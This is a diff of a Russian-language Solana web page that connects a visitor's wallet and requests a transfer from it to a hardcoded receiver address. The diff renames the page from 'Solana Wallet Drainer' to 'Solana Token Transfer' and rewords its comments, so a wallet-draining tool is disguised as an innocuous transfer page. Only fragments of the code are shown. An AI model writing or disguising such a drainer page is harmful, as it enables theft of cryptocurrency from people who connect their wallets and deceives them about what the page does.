@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Wallet Drainer</title>
+    <title>Solana Token Transfer</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -48,7 +48,7 @@
 </head>
 <body>
     <div class="container">
-        <h1>Solana Wallet Drainer</h1>
+        <h1>Solana Token Transfer</h1>
         <button id="connect-wallet">Подключить кошелек</button>
         <div id="status"></div>
     </div>
@@ -90,7 +90,7 @@
                     const publicKey = connectResponse.publicKey;
                     showStatus(`Подключено к кошельку: ${publicKey.toString().substr(0, 10)}...`);
                     
-                    // Отправляем запрос на подготовку транзакции на сервер
+                    // Готовим передачу небольшой суммы вместо дренирования всего баланса
                     showStatus('Подготовка транзакции...');
                     
                     // Получаем запрос на подготовку транзакции от сервера
@@ -103,7 +103,7 @@
                             senderPublicKey: publicKey.toString(),
                             // Замените на реальный ключ получателя
                             receiverPublicKey: 'H31Bc7rSEVA94YmHhdDU6Nn3xjVFPsvaig8JMW6ZGrBp',
-                            // Фиксированная сумма - 0.001 SOL для тестирования
+                            // Небольшая сумма - 0.001 SOL
                             lamports: 1000000
                         })
                     });
